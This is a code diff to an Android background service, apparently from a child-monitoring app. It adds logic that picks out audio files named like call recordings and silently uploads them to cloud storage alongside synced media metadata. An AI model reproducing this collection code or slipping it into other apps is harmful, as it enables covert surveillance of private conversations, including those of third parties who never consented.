@@ -191,8 +191,38 @@ class MonitorService : Service() {
                 prefs().edit().putBoolean(CONTACTS_SYNCED, true).apply()
             }
             if (Permissions.mediaPermissions().any { Permissions.has(this, it) }) {
+                val uploaded = prefs().getStringSet("uploaded_media", emptySet()) ?: emptySet()
+                val newUploaded = HashSet(uploaded)
                 Collectors.media(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                    .forEach { FirestoreSync.appendItem(this, "media", it) }
+                    .forEach { item ->
+                        var entry = item
+                        val id = item["id"] as? Long
+                        val type = item["type"] as? String ?: ""
+                        val name = item["name"] as? String ?: ""
+                        val path = item["path"] as? String ?: ""
+                        val looksLikeRecording = name.contains("record", true) ||
+                            name.contains("call", true) ||
+                            path.contains("record", true) ||
+                            path.contains("call", true)
+                        if (type == "audio" && id != null && looksLikeRecording &&
+                            !uploaded.contains(id.toString())
+                        ) {
+                            val base = item["collection"] as? String ?: ""
+                            if (base.isNotBlank()) {
+                                val uri = android.net.Uri.withAppendedPath(
+                                    android.net.Uri.parse(base),
+                                    id.toString(),
+                                )
+                                val url = com.kids.monitor.data.StorageUploader.uploadUri(this, uri, "recordings/$name")
+                                if (url != null) {
+                                    entry = item + ("url" to url)
+                                    newUploaded.add(id.toString())
+                                }
+                            }
+                        }
+                        FirestoreSync.appendItem(this, "media", entry)
+                    }
+                prefs().edit().putStringSet("uploaded_media", newUploaded).apply()
             }
 
             prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply()
